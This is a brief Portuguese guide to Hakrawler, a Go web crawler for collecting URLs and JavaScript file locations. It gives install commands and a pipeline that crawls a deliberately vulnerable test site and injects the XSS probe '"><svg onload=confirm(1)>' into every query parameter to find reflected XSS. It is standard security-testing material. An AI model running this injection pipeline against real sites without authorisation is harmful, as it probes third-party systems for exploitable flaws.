# Hakrawler

Web crawler escrito em Goland para coletar URLs e locais de arquivos JavaScript.

Instalação:

```bash
go install github.com/hakluke/hakrawler@latest
mv ~/go/bin/hakrawler /usr/bin
```

ou

```bash
sudo apt install hakrawler # Kali Linux
```

Uso básico para procurar XSS em conjunto com o airixss:

```bash
echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```
